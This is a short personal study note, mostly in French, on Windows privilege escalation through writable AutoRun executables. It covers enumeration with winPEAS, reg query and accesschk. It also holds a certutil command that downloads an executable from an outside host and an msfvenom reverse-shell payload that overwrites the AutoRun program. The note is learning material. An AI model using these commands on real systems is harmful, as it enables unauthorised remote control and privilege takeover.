This is my learning about windows Privilege Escalation
## Weak Registry Autoruns Escalation
Windows peut être configuré pour exécuter des commandes au démarrage, ce processus est appelé AutoRun. Ces exécutions automatiques sont configurées dans le registre. Si vous êtes en mesure d'écrire dans un exécutable AutoRun et de redémarrer le système (ou d'attendre qu'il soit redémarré), vous pouvez être en mesure d'élever vos privilèges.

Pour cela utilisons winpeas pour voir s'il ya des programmes qui ont un droit de autorun
```
certutil.exe -urlcache -f http://10.0.0.5/40564.exe bad.exe
.\winPEASany.exe quiet applicationsinfo
```
trouver un program d'autorun  qui es le program.exe dans `C:\Program Files\Autorun Program\program.exe`

Si nous souhaitons effectuer l'énumération manuellement, il suffit d'utiliser la commande ci-dessous :
```
reg query HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
```
Pour vérifier la permission du programme.exe, nous utiliserons accesschk.exe.

```
.\accesschk.exe /accepteula -wvu "Program path"
```
Maintenant pour l'exploiter on doit creer un program avec le meme nom que program.exe avec notre listner
```
msfvenom -p windows/shell_reverse_tcp lhost=10.4.5.83 lport=53 -f exe > shell.exe
```
copy it to program.exe
```
copy /Y shell.exe "C:\Program Files\Autorun Program\program.exe"
```